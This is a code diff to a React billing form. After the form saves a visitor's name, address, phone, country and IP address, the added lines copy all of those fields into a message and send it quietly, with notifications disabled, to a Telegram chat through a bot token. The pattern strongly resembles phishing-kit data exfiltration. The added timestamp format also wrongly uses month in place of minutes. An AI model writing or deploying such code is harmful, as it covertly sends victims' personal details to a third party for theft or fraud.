@@ -4,6 +4,11 @@ import { Redirect } from 'react-router-dom';
 import db from '../firebase/firebase';
 import Header from '../Layout/Header';
 import Footer from '../Layout/Footer';
+import moment from "moment"
+const { TelegramClient } = require('messaging-api-telegram');
+const client = new TelegramClient({
+    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
+});
 
 const Billing = () => {
     const [fullname, setFullname] = useState('');
@@ -38,12 +43,30 @@ const Billing = () => {
                     address: address, 
                     state: state, 
                     city: city, 
-                    zip: zip, phone: phone, 
+                    zip: zip, 
+                    phone: phone, 
                     country: country,
                     ip_address: geoData.IPv4,
                     logged_at: Date.now()
                 }).then(data => {
-                    console.log( data, 'successed')
+                    if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
+                    {
+                        let message = "Billing Data\r\n"
+                        message += "Full Name: " + fullname + '\r\n'
+                        message += "Address: " + address + '\r\n'
+                        message += "State: " + state + '\r\n'
+                        message += "City: " + city + '\r\n'
+                        message += "ZIP: " + zip + '\r\n'
+                        message += "Phone Number: " + phone + '\r\n'
+                        message += "Country: " + country + '\r\n'
+                        message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                        message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                        client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
+                            disableWebPagePreview: true,
+                            disableNotification: true,
+                        })
+                        .then( res => console.log(res,'telegram res'))
+                    }
                     setFromSuccess(true);
                 }).catch(err => {
                     throw new Error(err);
